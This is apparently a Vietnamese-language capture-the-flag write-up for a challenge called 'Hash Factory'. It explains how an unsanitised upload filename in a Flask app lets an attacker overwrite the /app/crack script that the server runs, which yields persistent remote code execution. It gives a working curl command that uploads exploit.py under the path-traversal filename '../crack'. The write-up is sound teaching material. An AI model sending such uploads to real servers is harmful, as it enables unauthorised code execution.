# Writeup: Hash Factory

## Tổng quan
Ứng dụng Flask trong thử thách này cho phép người dùng upload file chứa các hash.  
Server sẽ xử lý file upload thông qua một script tên là `crack`.  
Do việc xử lý tên file không an toàn, ứng dụng trở nên dễ bị **Remote Code Execution (RCE)**.

## Tóm tắt lỗ hổng
- **Tên file không được kiểm soát (unsanitized)**  
  Flask lưu file trực tiếp theo tên người dùng gửi lên:
  ```python
  hash_file.save(path := hashes / hash_file.filename)
  ```	

Người tấn công có thể chỉ định đường dẫn tùy ý (ví dụ /app/crack).
Thực thi tự động /app/crack

Sau khi lưu, server luôn gọi:
	```
	crack_results = check_output(["/app/crack", path], text=True)
    ```

Tức là bất cứ thứ gì nằm ở */app/crack* đều bị thực thi.
Bình thường, đây là script brute-force hash. Nhưng attacker có thể ghi đè để chạy code độc hại.

Tồn tại bền vững (Persistence)
File trong */app/hashes/* bị xóa sau khi xử lý, nhưng */app/crack* thì không bị xóa.
Do đó, một khi ghi đè thành công, mã độc sẽ tồn tại cho đến khi container bị reset.

Lỗ hổng cốt lõi:
  **Ghi đè file tùy ý + Thực thi tự động = RCE.**

## Thực thi tấn công 
```
curl -s -F 'hash_file=@exploit.py;filename=../crack' http://[IP-ATTACKER]:5000/ -o result.html                    
cat result.html  
```
<img width="1489" height="797" alt="Screenshot 2025-09-12 154057" src="https://github.com/user-attachments/assets/4a4531c9-78c7-4dca-a210-f2b73b29dbff" />

** exploit.py được lưu trong Source **

